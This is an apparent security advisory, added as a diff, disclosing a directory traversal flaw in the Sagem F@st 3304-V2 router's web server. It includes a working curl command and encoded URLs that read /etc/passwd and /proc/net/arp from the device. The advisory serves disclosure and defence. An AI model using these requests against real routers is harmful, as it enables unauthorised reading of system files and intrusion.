@@ -1,0 +1,21 @@
+# Title              : Sagem F@st 3304-V2 Directory Traversal Vulnerability
+# Vendor             : http://www.sagemcom.com
+# Severity           : High
+# Tested Router      : Sagem F@st 3304-V2 (3304, other versions may also be affected)
+# Date               : 2015-03-01
+# Author             : Loudiyi Mohamed
+# Contact            : Loudiyi.2010@gmail.com
+# Blog               : https://www.linkedin.com/pub/mohamed-loudiyi/86/81b/603
+ 
+# Vulnerability description:
+Sagem Fast is an ADSL Router using a web management interface in order to change configuration
+settings. The router is Sagem Fast is an ADSL Router using a web management interface in order
+to change configuration settings. 
+The web server of the router is vulnerable to directory traversal which allows reading files 
+by sending encoded '../' requests.
+
+The vulnerability may be tested with the following command-line:
+curl -v4 http://192.168.1.1//../../../../../../../../../../etc/passwd
+Or directly from navigateur:
+http://192.168.1.1/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+http://192.168.1.1/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fnet%2farp
